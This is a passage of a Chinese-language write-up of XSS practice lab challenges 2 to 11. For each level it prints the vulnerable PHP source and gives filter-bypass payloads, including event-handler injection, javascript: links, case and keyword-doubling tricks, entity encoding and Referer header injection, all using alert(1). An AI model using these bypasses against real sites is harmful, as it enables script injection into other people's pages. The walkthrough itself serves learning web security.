align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class=\"line\">&lt;form action=level2.php method=GET&gt;</span><br><span class=\"line\">&lt;input name=keyword  value=&quot;&#x27;.$str.&#x27;&quot;&gt;</span><br><span class=\"line\">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span><br><span class=\"line\">&lt;/form&gt;</span><br><span class=\"line\">&lt;/center&gt;&#x27;;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;center&gt;&lt;img src=level2.png&gt;&lt;/center&gt;</span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><code>Result</code></p>\n<p><img src=\"/images/XSS/image-20200828140717307.png\" alt=\"image-20200828140717307\"></p>\n<h5 id=\"挑战三\"><a href=\"#挑战三\" class=\"headerlink\" title=\"挑战三\"></a>挑战三</h5><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//闭合测试，发现&gt;被转义了</span><br><span class=\"line\">`&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;`</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/XSS/image-20200828142634784.png\" alt=\"image-20200828142634784\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//不使用&lt;等类似字符进行测试</span><br><span class=\"line\">`&#x27;onmouseover=alert(1)//`</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//对变量经过两次htmlspecialchars函数过滤</span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">ini_set(&quot;display_errors&quot;, 0);</span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\">str = <span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;keyword&quot;</span>];</span></span><br><span class=\"line\">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;</span><br><span class=\"line\">&lt;form action=level3.php method=GET&gt;</span><br><span class=\"line\">&lt;input name=keyword  value=&#x27;&quot;.htmlspecialchars($str).&quot;&#x27;&gt;</span><br><span class=\"line\">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class=\"line\">&lt;/form&gt;</span><br><span class=\"line\">&lt;/center&gt;&quot;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><code>Result</code></p>\n<p><img src=\"/images/XSS/image-20200828143012943.png\" alt=\"image-20200828143012943\"></p>\n<h5 id=\"挑战四\"><a href=\"#挑战四\" class=\"headerlink\" title=\"挑战四\"></a>挑战四</h5><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//基础测试，发现对&lt;、&gt;进行替换为空</span><br><span class=\"line\">`&quot;&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;`</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/XSS/image-20200828143756092.png\" alt=\"image-20200828143756092\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//不使用&lt;等类似字符进行测试</span><br><span class=\"line\">`&quot;onmouseover=alert(1)//`</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;对输入变量值中&lt;、&gt;进行替换</span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">ini_set(&quot;display_errors&quot;, 0);</span><br><span class=\"line\">$str &#x3D; $_GET[&quot;keyword&quot;];</span><br><span class=\"line\">$str2&#x3D;str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);</span><br><span class=\"line\">$str3&#x3D;str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);</span><br><span class=\"line\">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br><span class=\"line\">&lt;form action&#x3D;level4.php method&#x3D;GET&gt;</span><br><span class=\"line\">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.$str3.&#39;&quot;&gt;</span><br><span class=\"line\">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;</span><br><span class=\"line\">&lt;&#x2F;form&gt;</span><br><span class=\"line\">&lt;&#x2F;center&gt;&#39;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><code>Result</code></p>\n<p><img src=\"/images/XSS/image-20200828144232008.png\" alt=\"image-20200828144232008\"></p>\n<h5 id=\"挑战五\"><a href=\"#挑战五\" class=\"headerlink\" title=\"挑战五\"></a>挑战五</h5><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//基础测试，发现对&lt;、&gt;进行替换为空</span><br><span class=\"line\">`&quot;&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;`</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/XSS/image-20200828150406623.png\" alt=\"image-20200828150406623\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;&lt;script 转换成 &lt;scr_ipt ，on转换成 o_n</span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">ini_set(&quot;display_errors&quot;, 0);</span><br><span class=\"line\">$str &#x3D; strtolower($_GET[&quot;keyword&quot;]);</span><br><span class=\"line\">$str2&#x3D;str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</span><br><span class=\"line\">$str3&#x3D;str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class=\"line\">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br><span class=\"line\">&lt;form action&#x3D;level5.php method&#x3D;GET&gt;</span><br><span class=\"line\">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.$str3.&#39;&quot;&gt;</span><br><span class=\"line\">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;</span><br><span class=\"line\">&lt;&#x2F;form&gt;</span><br><span class=\"line\">&lt;&#x2F;center&gt;&#39;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//使用伪协议绕过</span><br><span class=\"line\">`&quot;&gt; &lt;a href=&quot;javascript:alert(1)&quot;&gt;click&lt;/a&gt;`</span><br></pre></td></tr></table></figure>\n\n<p><code>Result</code></p>\n<p><img src=\"/images/XSS/image-20200828151240091.png\" alt=\"image-20200828151240091\"></p>\n<h5 id=\"挑战六\"><a href=\"#挑战六\" class=\"headerlink\" title=\"挑战六\"></a>挑战六</h5><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//使用伪协议绕过</span><br><span class=\"line\">`&quot;&gt; &lt;a href=&quot;javascript:alert(1)&quot;&gt;click&lt;/a&gt;`</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/XSS/image-20200828151906636.png\" alt=\"image-20200828151906636\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;发现添加了多个属性进行过滤操作</span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">ini_set(&quot;display_errors&quot;, 0);</span><br><span class=\"line\">$str &#x3D; $_GET[&quot;keyword&quot;];</span><br><span class=\"line\">$str2&#x3D;str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</span><br><span class=\"line\">$str3&#x3D;str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class=\"line\">$str4&#x3D;str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class=\"line\">$str5&#x3D;str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class=\"line\">$str6&#x3D;str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class=\"line\">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br><span class=\"line\">&lt;form action&#x3D;level6.php method&#x3D;GET&gt;</span><br><span class=\"line\">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.$str6.&#39;&quot;&gt;</span><br><span class=\"line\">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;</span><br><span class=\"line\">&lt;&#x2F;form&gt;</span><br><span class=\"line\">&lt;&#x2F;center&gt;&#39;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//发现并未对大小写过滤，</span><br><span class=\"line\">`&quot;&gt; &lt;a HrEf=&quot;javascript:alert(1)&quot;&gt;click&lt;/a&gt;`</span><br></pre></td></tr></table></figure>\n\n<p><code>Result</code></p>\n<p><img src=\"/images/XSS/image-20200828152455501.png\" alt=\"image-20200828152455501\"></p>\n<h5 id=\"挑战七\"><a href=\"#挑战七\" class=\"headerlink\" title=\"挑战七\"></a>挑战七</h5><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//使用大小写测试</span><br><span class=\"line\">`&quot;&gt; &lt;a HrEf=&quot;javascript:alert(1)&quot;&gt;click&lt;/a&gt;`</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/XSS/image-20200828152734820.png\" alt=\"image-20200828152734820\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;添加script替换为空</span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">ini_set(&quot;display_errors&quot;, 0);</span><br><span class=\"line\">$str &#x3D;strtolower( $_GET[&quot;keyword&quot;]);</span><br><span class=\"line\">$str2&#x3D;str_replace(&quot;script&quot;,&quot;&quot;,$str);</span><br><span class=\"line\">$str3&#x3D;str_replace(&quot;on&quot;,&quot;&quot;,$str2);</span><br><span class=\"line\">$str4&#x3D;str_replace(&quot;src&quot;,&quot;&quot;,$str3);</span><br><span class=\"line\">$str5&#x3D;str_replace(&quot;data&quot;,&quot;&quot;,$str4);</span><br><span class=\"line\">$str6&#x3D;str_replace(&quot;href&quot;,&quot;&quot;,$str5);</span><br><span class=\"line\">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br><span class=\"line\">&lt;form action&#x3D;level7.php method&#x3D;GET&gt;</span><br><span class=\"line\">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.$str6.&#39;&quot;&gt;</span><br><span class=\"line\">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;</span><br><span class=\"line\">&lt;&#x2F;form&gt;</span><br><span class=\"line\">&lt;&#x2F;center&gt;&#39;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//重复绕过,</span><br><span class=\"line\">`&quot;&gt;&lt;sscriptcript&gt;alert(1)&lt;/sscriptcript&gt;`</span><br><span class=\"line\">`&quot;oonnmouseover=alert(1)`</span><br><span class=\"line\">`&quot;&gt;&lt;a hrhrefef=javascriscriptpt:alert(1)&gt;click&lt;/a&gt;`</span><br></pre></td></tr></table></figure>\n\n<p><code>Result</code></p>\n<p><img src=\"/images/XSS/image-20200828153152250.png\" alt=\"image-20200828153152250\"></p>\n<h5 id=\"挑战八\"><a href=\"#挑战八\" class=\"headerlink\" title=\"挑战八\"></a>挑战八</h5><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//重复测试</span><br><span class=\"line\">`&quot;&gt;&lt;sscriptcript&gt;alert(1)&lt;/sscriptcript&gt;`</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/XSS/image-20200828153930815.png\" alt=\"image-20200828153930815\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;在上面基础上添加了大小写过滤、属性中双引号被转换成HTML实体，无法截断属性，可以使用协议绕过javascript:alert，由于script关键字被过滤，</span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">ini_set(&quot;display_errors&quot;, 0);</span><br><span class=\"line\">$str &#x3D; strtolower($_GET[&quot;keyword&quot;]);</span><br><span class=\"line\">$str2&#x3D;str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class=\"line\">$str3&#x3D;str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class=\"line\">$str4&#x3D;str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class=\"line\">$str5&#x3D;str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class=\"line\">$str6&#x3D;str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class=\"line\">$str7&#x3D;str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);</span><br><span class=\"line\">echo &#39;&lt;center&gt;</span><br><span class=\"line\">&lt;form action&#x3D;level8.php method&#x3D;GET&gt;</span><br><span class=\"line\">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;</span><br><span class=\"line\">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;添加友情链接 &#x2F;&gt;</span><br><span class=\"line\">&lt;&#x2F;form&gt;</span><br><span class=\"line\">&lt;&#x2F;center&gt;&#39;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://www.qqxiuzi.cn/bianma/zifushiti.php\">在线实体编码</a></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//实体编码，javascript会被替换成javasc_rpt，我们使用&amp;#x72来代替r ,HTML字符实体转换：</span><br><span class=\"line\">`javascrip&amp;#x74;:alert(1)`</span><br><span class=\"line\">`javascript:%61lert(1)`</span><br><span class=\"line\">`javasc&amp;#x72;ipt:alert`1``</span><br><span class=\"line\">`javasc&amp;#x0072;ipt:alert`1``</span><br></pre></td></tr></table></figure>\n\n<p><code>Result</code></p>\n<p><img src=\"/images/XSS/image-20200828154518631.png\" alt=\"image-20200828154518631\"></p>\n<h5 id=\"挑战九\"><a href=\"#挑战九\" class=\"headerlink\" title=\"挑战九\"></a>挑战九</h5><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//实体编码测试</span><br><span class=\"line\">`javascrip&amp;#x74;:alert(1)`</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/XSS/image-20200828154756855.png\" alt=\"image-20200828154756855\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;在之前基础上，添加的链接是http:&#x2F;&#x2F;头信息</span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">ini_set(&quot;display_errors&quot;, 0);</span><br><span class=\"line\">$str &#x3D; strtolower($_GET[&quot;keyword&quot;]);</span><br><span class=\"line\">$str2&#x3D;str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class=\"line\">$str3&#x3D;str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class=\"line\">$str4&#x3D;str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class=\"line\">$str5&#x3D;str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class=\"line\">$str6&#x3D;str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class=\"line\">$str7&#x3D;str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);</span><br><span class=\"line\">echo &#39;&lt;center&gt;</span><br><span class=\"line\">&lt;form action&#x3D;level9.php method&#x3D;GET&gt;</span><br><span class=\"line\">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;</span><br><span class=\"line\">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;添加友情链接 &#x2F;&gt;</span><br><span class=\"line\">&lt;&#x2F;form&gt;</span><br><span class=\"line\">&lt;&#x2F;center&gt;&#39;;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">if(false&#x3D;&#x3D;&#x3D;strpos($str7,&#39;http:&#x2F;&#x2F;&#39;))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href&#x3D;&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;&#x2F;a&gt;&lt;&#x2F;center&gt;&#39;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">else</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href&#x3D;&quot;&#39;.$str7.&#39;&quot;&gt;友情链接&lt;&#x2F;a&gt;&lt;&#x2F;center&gt;&#39;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//添加http://信息</span><br><span class=\"line\">`javascrip&amp;#x74;:alert(1)//http://xxx.com ` //利用注释</span><br><span class=\"line\">`javascrip&amp;#x74;:%0dhttp://xxx.com%0dalert(1) ` //不利用注释</span><br><span class=\"line\">`javascrip&amp;#x74;:%0ahttp://xxx.com%0daalert(1)`  //不利用注释</span><br></pre></td></tr></table></figure>\n\n<p><code>Result</code></p>\n<p><img src=\"/images/XSS/image-20200828155322234.png\" alt=\"image-20200828155322234\"></p>\n<h5 id=\"挑战十\"><a href=\"#挑战十\" class=\"headerlink\" title=\"挑战十\"></a>挑战十</h5><p>发现一个隐藏输入框</p>\n<p><img src=\"/images/XSS/image-20200828155806918.png\" alt=\"image-20200828155806918\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;多了个参数、多了一个输入框且已经隐藏、并对&lt;、&gt;括号进行过滤，htmlspecialchars函数过滤</span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">ini_set(&quot;display_errors&quot;, 0);</span><br><span class=\"line\">$str &#x3D; $_GET[&quot;keyword&quot;];</span><br><span class=\"line\">$str11 &#x3D; $_GET[&quot;t_sort&quot;];</span><br><span class=\"line\">$str22&#x3D;str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class=\"line\">$str33&#x3D;str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class=\"line\">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br><span class=\"line\">&lt;form id&#x3D;search&gt;</span><br><span class=\"line\">&lt;input name&#x3D;&quot;t_link&quot;  value&#x3D;&quot;&#39;.&#39;&quot; type&#x3D;&quot;hidden&quot;&gt;</span><br><span class=\"line\">&lt;input name&#x3D;&quot;t_history&quot;  value&#x3D;&quot;&#39;.&#39;&quot; type&#x3D;&quot;hidden&quot;&gt;</span><br><span class=\"line\">&lt;input name&#x3D;&quot;t_sort&quot;  value&#x3D;&quot;&#39;.$str33.&#39;&quot; type&#x3D;&quot;hidden&quot;&gt;</span><br><span class=\"line\">&lt;&#x2F;form&gt;</span><br><span class=\"line\">&lt;&#x2F;center&gt;&#39;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//添加参数并构造PoC</span><br><span class=\"line\">`keyword = test&amp;t_sort=&quot;type=&quot;text&quot; onclick = &quot;alert(1)`</span><br><span class=\"line\">`keyword = test&amp;t_sort=&quot;type=&quot;text&quot; onmouseover=&quot;alert(1)`</span><br><span class=\"line\">`keyword = test&amp;t_sort=&quot;type=&quot;text&quot; onmouseover=alert`1``</span><br></pre></td></tr></table></figure>\n\n<p><code>Result</code></p>\n<p><img src=\"/images/XSS/image-20200828160245970.png\" alt=\"image-20200828160245970\"></p>\n<h5 id=\"挑战十一\"><a href=\"#挑战十一\" class=\"headerlink\" title=\"挑战十一\"></a>挑战十一</h5><p>之前测试发现无效果，查看源码</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//比之前多了个请求头REFERER进行指定来源</span></span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">ini_set(<span class=\"string\">&quot;display_errors&quot;</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">$str = $_GET[<span class=\"string\">&quot;keyword&quot;</span>];</span><br><span class=\"line\">$str00 = $_GET[<span class=\"string\">&quot;t_sort&quot;</span>];</span><br><span class=\"line\">$str11=$_SERVER[<span class=\"string\">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class=\"line\">$str22=str_replace(<span class=\"string\">&quot;&gt;&quot;</span>,<span class=\"string\">&quot;&quot;</span>,$str11);</span><br><span class=\"line\">$str33=str_replace(<span class=\"string\">&quot;&lt;&quot;</span>,<span class=\"string\">&quot;&quot;</span>,$str22);</span><br><span class=\"line\">echo <span class=\"string\">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars($str).<span class=\"string\">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class=\"string\">&#x27;&lt;center&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;form id=search&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class=\"string\">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class=\"string\">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars($str00).<span class=\"string\">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;</span>.$str33.<span class=\"string\">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/form&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/center&gt;&#x27;</span>;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//修改请求头并修改一下PoC代码</span><br><span class=\"line\">`Referer: &quot; onmouseover=alert(1) type=&quot;text&quot;`</span><br><span class=\"line\">`Referer: &quot; onclick=&quot;alert(1) type=&quot;text&quot;`</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/XSS/image-20200828161500548.png\" 